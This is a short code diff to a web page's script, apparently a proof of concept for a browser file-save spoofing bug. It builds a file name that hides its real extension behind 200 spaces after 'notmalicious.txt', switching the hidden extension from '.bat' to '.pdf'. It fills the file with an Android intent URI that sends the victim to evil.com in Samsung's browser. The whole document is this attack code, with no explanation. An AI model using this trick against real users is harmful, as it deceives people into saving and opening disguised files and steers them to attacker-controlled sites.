@@ -13,7 +13,7 @@
 
   <script>
     async function saveFile() {
-      const fileName = 'notmalicious.txt' + ' '.repeat(200) + '.bat';
+      const fileName = 'notmalicious.txt' + ' '.repeat(200) + '.pdf';
       const fileContent = 'intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end';
       const fileBlob = new Blob([fileContent], { type: 'text/plain' });
 
@@ -27,7 +27,7 @@
             suggestedName: fileName,
             types: [{
               description: 'Text file',
-              accept: { 'text/plain': ['.bat'] }
+              accept: { 'text/plain': ['.pdf'] }
             }]
           });
           const writable = await handle.createWritable();
